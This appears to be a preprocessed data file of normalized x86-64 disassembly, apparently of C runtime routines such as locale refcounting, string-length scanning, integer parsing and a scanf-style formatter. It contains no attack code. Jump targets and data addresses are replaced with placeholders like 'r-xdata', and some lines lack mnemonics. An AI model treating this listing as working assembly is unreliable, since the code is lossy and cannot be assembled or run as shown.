mov ecx r12d
call sub_18000c464
mov r13d eax
cmp eax edi
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
[ rcx ] 0xffffffff
jne r-xdata
lea r12 [ rw-data ]
cmp rbx r12
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
cmp rcx r12
je r-xdata
call sub_1800075a8
mov [ rax ] 0x16
jmp r-xdata
mov rcx rbx
call sub_180004690
test [ rw-data ] 0x1
jne r-xdata
mov [ rsi + 0xb8 ] rbx
[ rbx ] 0x1
test [ rsi + 0xc8 ] 0x2
jne r-xdata
call sub_180004690
jmp r-xdata
mov ecx 0xd
call sub_18000bc50
nop
mov eax [ rbx + 0x4 ]
mov [ rw-data ] eax
mov eax [ rbx + 0x8 ]
mov [ rw-data ] eax
mov eax [ rbx + 0xc ]
mov [ rw-data ] eax
mov edx edi
mov [ rsp + 0x20 ] edx
lea r8 [ __dos_header ]
mov edx edi
mov [ rsp + 0x20 ] edx
movsxd rcx edx
movzx eax [ rbx + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x1e178 ] ax
inc edx
mov [ rsp + 0x20 ] edx
jmp r-xdata
mov [ rsp + 0x20 ] edi
movsxd rcx edx
mov al [ rcx + rbx + 0x1c ]
mov [ rcx + r8 + 0x1cd30 ] al
inc edx
mov [ rsp + 0x20 ] edx
jmp r-xdata
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ] 0xffffffff
jne r-xdata
movsxd rcx edi
mov al [ rcx + rbx + 0x11d ]
mov [ rcx + r8 + 0x1ce40 ] al
inc edi
mov [ rsp + 0x20 ] edi
jmp r-xdata
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rbx
[ rbx ] 0x1
mov ecx 0xd
call sub_18000bb50
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
cmp edi 0x100
jge r-xdata
call sub_180004690
sub_18000c8fc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rbx + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rbx + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x110 ]
test rax rax
je r-xdata
lea rdi [ rbx + 0x58 ]
mov esi 0x6
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x138 ]
sub rcx 0xfe
call sub_180004690
mov rcx [ rbx + 0x148 ]
mov edi 0x80
sub rcx rdi
call sub_180004690
mov rcx [ rbx + 0x150 ]
sub rcx rdi
call sub_180004690
mov rcx [ rbx + 0x130 ]
call sub_180004690
cmp [ rax ] 0x0
jne r-xdata
cmp [ rdi - 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
call sub_180012040
mov rcx [ rbx + 0x158 ]
call sub_180004690
mov rcx [ rbx + 0x120 ]
test rcx rcx
je r-xdata
add rdi 0x20
sub rsi 0x1
jne r-xdata
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp [ rdi - 0x10 ] rax
je r-xdata
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180004690
cmp [ rcx ] 0x0
jne r-xdata
call sub_180004690
mov rcx [ rbx + 0x110 ]
call sub_180004690
mov rcx [ rbx + 0x128 ]
call sub_180004690
cmp [ rcx ] 0x0
jne r-xdata
call sub_180004690
mov rcx [ rbx + 0x128 ]
call sub_180012274
call sub_180004690
call sub_180004690
mov rcx [ rbx + 0x128 ]
call sub_18001222c
sub_18000ca78
[ rcx ] 0x1
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] 0x1
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] 0x1
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] 0x1
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] 0x1
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
sub r8 0x1
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] 0x1
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] 0x1
retn
[ rdx ] 0x1
sub_18000cb10
test rcx rcx
je r-xdata
mov rax rcx
retn
or r9d 0xffffffff
[ rcx ] r9d
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] r9d
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] r9d
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
sub r8 0x1
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] r9d
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] r9d
[ rdx ] r9d
sub_18000cbb8
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
jmp r-xdata
mov [ rcx ] rdx
mov rcx rdx
call sub_18000ca78
test r10 r10
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r10
call sub_18000cb10
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_18000c8fc
sub_18000cc10
push rbx
sub rsp 0x20
call sub_1800068b0
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_18000bc50
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_18000cbb8
mov rbx rax
mov ecx 0xc
call sub_18000bb50
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_180006d18
call sub_1800068b0
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_18000cc88
mov [ rsp + 0x8 ] cx
push rbx
sub rsp 0x60
mov eax 0xffff
movzx ebx dx
cmp cx ax
jne r-xdata
mov eax 0x100
cmp cx ax
jae r-xdata
xor ecx ecx
mov ax cx
jmp r-xdata
lea rcx [ rsp + 0x40 ]
mov rdx r8
call sub_180005710
mov r11 [ rsp + 0x40 ]
mov edx 0x1
mov eax [ r11 + 0x14 ]
lea r8 [ rsp + 0x70 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] eax
mov eax [ r11 + 0x4 ]
mov r9d edx
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x78 ]
mov [ rsp + 0x20 ] rax
call sub_1800124f8
xor ecx ecx
cmp eax ecx
jne r-xdata
mov rax [ rw-data ]
movzx ecx cx
mov ax [ rax + rcx * 2 ]
and ax bx
jmp r-xdata
movzx eax ax
movzx ecx bx
and eax ecx
add rsp 0x60
pop rbx
retn
mov ax [ rsp + 0x78 ]
mov eax ecx
mov [ rsp + 0x78 ] cx
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
mov ax [ rsp + 0x78 ]
cmp [ rsp + 0x58 ] cl
je r-xdata
sub_18000cd44
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x70
movsxd rdi ecx
lea rcx [ rsp + 0x50 ]
call sub_180005710
cmp edi 0x100
jae r-xdata
mov rax [ rsp + 0x50 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rdx [ rsp + 0x50 ]
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
call sub_1800075a8
mov edx 0x1
mov [ rax ] 0x2a
mov [ rsp + 0x80 ] dil
mov [ rsp + 0x81 ] 0x0
mov ebp edi
lea rdx [ rsp + 0x50 ]
sar ebp 0x8
movzx ecx bpl
call sub_1800057bc
test eax eax
je r-xdata
mov rax [ rdx + 0x140 ]
movzx eax [ rax + rdi * 2 ]
and eax 0x1
lea r8 [ rsp + 0x50 ]
mov edx 0x1
mov ecx edi
call sub_18001255c
mov rdx [ rsp + 0x50 ]
jmp r-xdata
cmp [ rsp + 0x68 ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ rsp + 0x90 ]
je r-xdata
mov [ rsp + 0x80 ] bpl
mov [ rsp + 0x81 ] dil
mov [ rsp + 0x82 ] 0x0
mov edx 0x2
jmp r-xdata
mov rax [ rdx + 0x148 ]
movzx eax [ rax + rdi ]
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ rsp + 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x68 ] 0x0
je r-xdata
movzx ecx [ rsp + 0x91 ]
shl eax 0x8
or eax ecx
mov rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] 0x1
lea r9 [ rsp + 0x80 ]
mov eax [ rcx + 0x4 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x90 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edx
mov edx [ rcx + 0x14 ]
lea rcx [ rsp + 0x50 ]
call sub_180011cb0
test eax eax
je r-xdata
mov rbp [ rsp + 0x88 ]
add rsp 0x70
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18000ceb4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x50
mov r14 rdx
mov rdx rcx
lea rcx [ rax - 0x38 ]
mov r12d r9d
mov r13 r8
call sub_180005710
test r13 r13
je r-xdata
test r14 r14
jne r-xdata
mov [ r13 ] r14
test r12d r12d
je r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
cmp [ rsp + 0x48 ] 0x0
jmp r-xdata
mov bpl [ r14 ]
mov r8 [ rsp + 0x30 ]
xor edi edi
lea rbx [ r14 + 0x1 ]
cmp r12d 0x2
jl r-xdata
je r-xdata
mov rax [ r8 + 0x140 ]
movzx ecx bpl
movzx eax [ rax + rcx * 2 ]
and eax 0x8
lea r8 [ rsp + 0x30 ]
movzx ecx bpl
mov edx 0x8
call sub_18001255c
mov r8 [ rsp + 0x30 ]
jmp r-xdata
cmp r12d 0x24
jg r-xdata
xor eax eax
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov esi [ rsp + 0x90 ]
cmp bpl 0x2d
jne r-xdata
mov bpl [ rbx ]
inc rbx
jmp r-xdata
test eax eax
je r-xdata
cmp bpl 0x2b
jne r-xdata
or esi 0x2
jmp r-xdata
cmp [ r8 + 0x10c ] 0x1
jle r-xdata
test r12d r12d
js r-xdata
mov bpl [ rbx ]
inc rbx
test r13 r13
je r-xdata
cmp r12d 0x1
je r-xdata
cmp [ rsp + 0x48 ] dil
mov [ r13 ] r14
cmp r12d 0x24
jg r-xdata
test r12d r12d
jne r-xdata
cmp r12d 0x10
jne r-xdata
cmp bpl 0x30
je r-xdata
mov r10 [ r8 + 0x140 ]
xor edx edx
or eax 0xffffffff
div r12d
mov r9d eax
cmp bpl 0x30
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0xa
jmp r-xdata
test r8d 0x103
je r-xdata
movsx ecx bpl
sub ecx 0x30
jmp r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0x10
jmp r-xdata
cmp [ rbx ] 0x58
je r-xdata
dec rbx
test sil 0x8
jne r-xdata
lea eax [ rbp - 0x61 ]
movsx ecx bpl
cmp al 0x19
ja r-xdata
cmp ecx r12d
jae r-xdata
mov bpl [ rbx + 0x1 ]
add rbx 0x2
cmp [ rbx ] 0x58
jne r-xdata
mov r12d 0x8
jmp r-xdata
mov ebp 0x7fffffff
test sil 0x4
jne r-xdata
test r13 r13
cmovne rbx r14
xor edi edi
jmp r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or esi 0x8
cmp edi r9d
jb r-xdata
call sub_1800075a8
mov [ rax ] 0x22
test sil 0x1
je r-xdata
test sil 0x1
jne r-xdata
test r13 r13
je r-xdata
imul edi r12d
add edi ecx
jne r-xdata
mov al sil
and al 0x2
neg al
sbb edi edi
neg edi
add edi ebp
or edi 0xffffffff
jmp r-xdata
mov eax esi
and eax 0x2
je r-xdata
test sil 0x2
je r-xdata
mov [ r13 ] rbx
movzx ecx bpl
movzx r8d [ r10 + rcx * 2 ]
test r8b 0x4
je r-xdata
or esi 0x4
test r13 r13
jne r-xdata
cmp ecx edx
jbe r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
neg edi
mov bpl [ rbx ]
inc rbx
jmp r-xdata
cmp edi ebp
jbe r-xdata
mov eax edi
jmp r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
sub_18000d138
sub rsp 0x38
xor eax eax
mov r9d r8d
mov r8 rdx
mov [ rsp + 0x20 ] eax
mov rdx rcx
cmp [ rw-data ] eax
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_18000ceb4
add rsp 0x38
retn
sub_18000d180
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_18000d228
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi r9
mov rdi r8
mov rbx rdx
cmp rcx [ rdx ]
jne r-xdata
mov eax 0x1
cmp [ r8 ] r9
jne r-xdata
mov rdx [ rdx ]
mov rcx [ rdi ]
mov r8d 0x2
call sub_180006c48
test rax rax
je r-xdata
mov rcx [ rbx ]
mov edx 0x2
call sub_180006b3c
mov [ rdi ] rax
test rax rax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rdi ] rax
mov rcx [ rbx ]
add rcx rcx
mov [ rbx ] rcx
mov rax [ rsp + 0x50 ]
mov rdx rsi
mov [ rax ] 0x1
mov r8 [ rbx ]
mov rcx [ rdi ]
call sub_1800059c0
mov r11 [ rbx ]
add r11 r11
mov [ rbx ] r11
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18000d2c0
sub rsp 0x28
add [ rcx + 0x8 ] 0xffffffff
js r-xdata
call sub_180008a04
mov edx eax
mov rax [ rcx ]
movzx edx [ rax ]
inc rax
mov [ rcx ] rax
jmp r-xdata
mov eax edx
add rsp 0x28
retn
sub_18000d2e8
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x280
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x270 ] rax
xor r15d r15d
lea r12 [ rsp + 0x110 ]
mov [ rsp + 0xb0 ] r9
mov rbx r8
mov rbp rdx
mov [ rsp + 0x50 ] rdx
mov [ rsp + 0x70 ] r12
mov rsi rcx
mov [ rsp + 0x60 ] rcx
mov [ rsp + 0xa0 ] 0x15e
mov [ rsp + 0x7c ] r15d
mov [ rsp + 0x78 ] r15w
mov edi r15d
mov [ rsp + 0x3c ] r15d
cmp rdx r15
jne r-xdata
cmp rcx r15
je r-xdata
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r15
mov [ rax ] 0x16
call sub_180008530
or eax 0xffffffff
jmp r-xdata
or r14d 0xffffffff
test [ rcx + 0x18 ] 0x40
jne r-xdata
mov rcx [ rsp + 0x270 ]
xor rcx rsp
call sub_1800042d0
mov rbx [ rsp + 0x2d0 ]
add rsp 0x280
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea rcx [ rsp + 0xc0 ]
mov rdx rbx
call sub_180005710
mov al [ rbp ]
mov ebx r15d
mov [ rsp + 0x39 ] r15b
mov r13d r15d
mov [ rsp + 0x34 ] r15d
mov [ rsp + 0x6c ] ebx
cmp al r15b
je r-xdata
call sub_180009454
lea rdx [ rw-data ]
lea r9 [ rw-data ]
cmp eax r14d
je r-xdata
cmp [ rsp + 0xd8 ] r15b
je r-xdata
mov ebx 0x1
mov r12b 0x25
mov r8 rdx
cmp eax 0xfffffffe
je r-xdata
mov eax ebx
mov rcx [ rsp + 0xd0 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ rbp ] r12b
jne r-xdata
sub r13d ebx
jmp r-xdata
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r15
mov [ rax ] 0x16
call sub_180008530
cmp eax r14d
je r-xdata
movsxd r8 eax
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 ]
jmp r-xdata
add r13d ebx
mov rcx rsi
mov [ rsp + 0x34 ] r13d
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
movzx eax [ rbp ]
add rbp rbx
mov [ rsp + 0x50 ] rbp
cmp eax edi
jne r-xdata
cmp [ rbp + 0x1 ] r12b
je r-xdata
add r13d ebx
mov rcx rsi
mov [ rsp + 0x34 ] r13d
call sub_18000d2c0
mov ebx eax
cmp eax r14d
je r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
cmp edi r14d
je r-xdata
movzx ecx dil
call sub_180005804
cmp eax r15d
je r-xdata
cmp [ rbp ] r12b
jne r-xdata
xor eax eax
mov [ rsp + 0x5c ] r15d
mov [ rsp + 0x80 ] r15b
mov [ rsp + 0x4c ] r15d
mov edi r15d
mov r13d r15d
mov [ rsp + 0x58 ] r15b
mov [ rsp + 0x40 ] r15b
mov [ rsp + 0x30 ] r15b
mov sil r15b
mov [ rsp + 0xa8 ] r15d
mov r15 [ rsp + 0x50 ]
mov bpl al
mov r12d eax
mov [ rsp + 0x38 ] bl
mov ebx 0x1
movzx ecx al
call sub_18001276c
cmp eax r15d
jne r-xdata
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 ]
xor ebx ebx
mov rdx rsi
cmp edi r14d
jne r-xdata
mov rcx rsi
call sub_18000d2c0
movzx ecx [ rbp ]
add rbp rbx
mov [ rsp + 0x50 ] rbp
cmp ecx eax
jne r-xdata
lea rax [ rbp + 0x1 ]
cmp [ rax ] r12b
cmove rbp rax
cmp ebx 0x2a
je r-xdata
lea eax [ r13 + r13 * 4 ]
inc edi
lea r13d [ rbx + rax * 2 - 0x30 ]
add rbp rbx
movzx ecx [ rbp ]
call sub_18001276c
cmp eax r15d
jne r-xdata
mov [ rsp + 0x50 ] rbp
jmp r-xdata
mov ebx 0x1
mov rdx rsi
mov ecx ebx
call sub_1800127ec
cmp edi r14d
jne r-xdata
mov rcx [ rsp + 0x70 ]
call sub_180004690
mov al [ rbp ]
cmp al r15b
je r-xdata
cmp [ rbp ] r12b
jne r-xdata
cmp eax r14d
je r-xdata
mov cl [ rsp + 0x30 ]
mov ebx 0x1
add cl bl
mov [ rsp + 0x30 ] cl
jmp r-xdata
cmp ebx 0x46
je r-xdata
add r15 rbx
movzx ebx [ r15 ]
mov ecx ebx
call sub_180012668
xor edx edx
cmp eax edx
je r-xdata
mov [ rsp + 0x68 ] edi
mov edi [ rsp + 0x3c ]
mov [ rsp + 0x44 ] r12d
mov r12b [ rsp + 0x80 ]
mov [ rsp + 0x50 ] r15
mov r15d [ rsp + 0xa8 ]
mov [ rsp + 0x48 ] r13d
cmp cl dl
jne r-xdata
mov ebx [ rsp + 0x6c ]
xor r15d r15d
mov eax [ rsp + 0x6c ]
cmp eax ebx
jne r-xdata
jmp r-xdata
cmp [ rbp + 0x1 ] 0x6e
jne r-xdata
mov rdx rsi
mov ecx eax
call sub_1800127ec
cmp sil dl
je r-xdata
mov ebx 0x1
cmp ebx 0x49
je r-xdata
mov [ rsp + 0x98 ] rdx
mov rax [ rsp + 0xb0 ]
mov [ rsp + 0xe0 ] rax
add rax 0x8
mov [ rsp + 0xb0 ] rax
mov rax [ rax - 0x8 ]
mov [ rsp + 0x98 ] rax
jmp r-xdata
mov r14d eax
mov dl [ rsp + 0x39 ]
cmp dl bl
je r-xdata
movzx ecx al
call sub_18001276c
cmp eax r15d
je r-xdata
mov al [ r15 + 0x1 ]
cmp al 0x36
jne r-xdata
cmp ebx 0x4c
je r-xdata
mov r8d 0x1
cmp [ rax ] 0x53
je r-xdata
mov rax [ rsp + 0x50 ]
mov bl dl
cmp bpl dl
jne r-xdata
mov eax r14d
jmp r-xdata
mov rcx [ rsp + 0xd0 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0xd8 ] bl
je r-xdata
cmp al 0x33
jne r-xdata
lea rcx [ r15 + 0x2 ]
cmp [ rcx ] 0x34
jne r-xdata
mov ebx 0x1
add [ rsp + 0x38 ] bl
jmp r-xdata
cmp ebx 0x4e
je r-xdata
mov eax [ rsp + 0x68 ]
mov esi [ rsp + 0x48 ]
cmp eax edx
je r-xdata
cmp r13d 0x63
je r-xdata
mov r8d 0x1
mov bpl r8b
jmp r-xdata
cmp [ rax ] 0x43
je r-xdata
cmp al 0x64
je r-xdata
lea rcx [ r15 + 0x2 ]
cmp [ rcx ] 0x32
jne r-xdata
mov r15 rcx
mov cl [ rsp + 0x30 ]
cmp ebx 0x68
je r-xdata
cmp r13d 0x6f
jg r-xdata
cmp esi edx
je r-xdata
mov rcx [ rsp + 0x60 ]
add [ rsp + 0x34 ] r8d
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
cmp r13d 0x7b
je r-xdata
movzx r13d [ rax ]
or r13d 0x20
mov [ rsp + 0xb8 ] r13d
cmp r13d 0x6e
je r-xdata
mov bpl r14b
mov ebx 0x1
jmp r-xdata
cmp al 0x69
je r-xdata
mov r15 rcx
jmp r-xdata
add r12d ebx
mov [ rsp + 0x88 ] rdx
jmp r-xdata
add [ rsp + 0x38 ] r14b
add bpl r14b
jmp r-xdata
cmp ebx 0x6c
je r-xdata
cmp r13d 0x70
je r-xdata
je r-xdata
cmp edi r14d
je r-xdata
mov cl [ rsp + 0x30 ]
xor edx edx
mov rsi [ rsp + 0x60 ]
mov r15d [ rsp + 0x34 ]
mov r13d 0x1
cmp al 0x6f
je r-xdata
cmp [ r15 + 0x1 ] 0x6c
mov ebx 0x1
jne r-xdata
cmp ebx 0x77
mov ebx 0x1
je r-xdata
mov r12d [ rsp + 0x44 ]
mov ecx 0x1
mov [ rsp + 0x88 ] rdx
add r12d ecx
mov [ rsp + 0x38 ] cl
jmp r-xdata
cmp r13d 0x73
je r-xdata
mov r12d [ rsp + 0x44 ]
mov ecx 0x1
cmp r13d 0x63
je r-xdata
mov rdx [ rsp + 0x60 ]
jmp r-xdata
mov r13d [ rsp + 0xb8 ]
mov [ rsp + 0x34 ] r15d
mov r15d [ rsp + 0xa8 ]
jmp r-xdata
movzx ecx al
call sub_18001276c
test eax eax
jne r-xdata
cmp al 0x78
je r-xdata
add [ rsp + 0x38 ] bl
inc r15
add bpl bl
jmp r-xdata
jmp r-xdata
cmp edi 0x2d
jne r-xdata
cmp bpl dl
mov rbp [ rsp + 0x50 ]
movzx r15d r15b
mov r11d 0x1
cmovg r15d r11d
cmp r13d 0x75
je r-xdata
cmp edi 0x2b
jne r-xdata
mov [ rsp + 0x40 ] cl
jmp r-xdata
mov r11d 0x1
cmp eax edx
jne r-xdata
cmp r13d 0x64
je r-xdata
mov ecx edi
call sub_1800127ec
cmp edi r14d
je r-xdata
mov rcx rsi
add r15d r13d
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
cmp eax r14d
je r-xdata
cmp al 0x58
je r-xdata
add sil bl
jmp r-xdata
mov r12b [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
mov ecx edi
call sub_1800127ec
mov ecx [ rsp + 0x34 ]
mov r11d 0x1
cmp r13d 0x78
je r-xdata
mov r15 [ rsp + 0x60 ]
sub esi ecx
mov [ rsp + 0x48 ] esi
jne r-xdata
cmp bpl dl
mov rbp [ rsp + 0x50 ]
jle r-xdata
mov [ rsp + 0x68 ] r11d
add esi r11d
jle r-xdata
mov ebx 0x1
mov [ rsp + 0x88 ] rdx
add r12d ebx
add ecx r11d
mov [ rsp + 0x34 ] ecx
mov rcx [ rsp + 0x60 ]
call sub_18000d2c0
movsxd rdi eax
mov [ rsp + 0x3c ] edi
cmp edi r14d
je r-xdata
mov eax esi
sub esi r11d
cmp eax edx
je r-xdata
mov r15d 0x1
cmp edi 0x2d
jne r-xdata
cmp r13d 0x7b
je r-xdata
cmp bl sil
mov esi [ rsp + 0x5c ]
jne r-xdata
cmp bl sil
mov rsi [ rsp + 0x88 ]
jne r-xdata
add [ rsp + 0x34 ] ecx
mov r15 [ rsp + 0x60 ]
mov rcx r15
call sub_18000d2c0
mov edi eax
mov [ rsp + 0x3c ] eax
jmp r-xdata
cmp eax edx
je r-xdata
mov ecx [ rsp + 0x34 ]
mov rbx [ rsp + 0x98 ]
sub ecx r11d
mov [ rsp + 0x34 ] ecx
cmp edi r14d
je r-xdata
mov r15b r11b
jmp r-xdata
mov rbp [ rsp + 0x50 ]
movzx eax [ rbp ]
cmp eax edi
jne r-xdata
cmp r13d 0x67
jle r-xdata
mov r11d 0x1
sub [ rsp + 0x34 ] r11d
cmp edi r14d
je r-xdata
cmp r13d 0x63
je r-xdata
mov rax [ rsp + 0x98 ]
cmp rbx rax
je r-xdata
cmp edi 0x2b
jne r-xdata
mov [ rsp + 0x40 ] r15b
jmp r-xdata
cmp bpl dl
mov rbp [ rsp + 0x50 ]
mov eax 0x1
movzx r15d r15b
cmovg r15d eax
add rbp rax
cmp [ rbp ] 0x5e
jne r-xdata
xor r15d r15d
cmp [ rsp + 0x40 ] r15b
je r-xdata
mov ebp [ rsp + 0x48 ]
mov ebx [ rsp + 0x34 ]
xor r15d r15d
cmp [ rsp + 0x40 ] r15b
je r-xdata
mov ebp [ rsp + 0x48 ]
mov ebx [ rsp + 0x34 ]
xor esi esi
cmp r12d esi
je r-xdata
mov bl cl
jmp r-xdata
mov dl [ rsp + 0x39 ]
mov r13d [ rsp + 0x34 ]
xor r15d r15d
add dl r14b
mov [ rsp + 0x39 ] dl
cmp cl r15b
jne r-xdata
xor r15d r15d
mov rbx r15
lea ebp [ r15 + 0x1 ]
cmp edi 0x2d
jne r-xdata
cmp r13d 0x69
je r-xdata
xor edx edx
mov rdx [ rsp + 0x60 ]
mov ecx edi
call sub_1800127ec
mov r11d 0x1
xor edx edx
cmp [ rsp + 0x30 ] dl
jne r-xdata
cmp r13d 0x73
jne r-xdata
cmp [ rsp + 0x30 ] dl
jne r-xdata
mov r12d [ rsp + 0x34 ]
mov rbp [ rsp + 0x60 ]
sub esi r15d
mov [ rsp + 0x48 ] esi
jne r-xdata
xor edx edx
lea rcx [ rsp + 0xe8 ]
lea r8d [ rdx + 0x20 ]
call sub_180009540
cmp [ rbp ] 0x5d
mov r11d 0x1
jne r-xdata
inc rbp
mov [ rsp + 0x58 ] r14b
mov eax [ rsp + 0x4c ]
cmp r13d 0x46
cmove eax r15d
cmp eax r15d
je r-xdata
neg esi
mov [ rsp + 0x5c ] esi
movzx esi dil
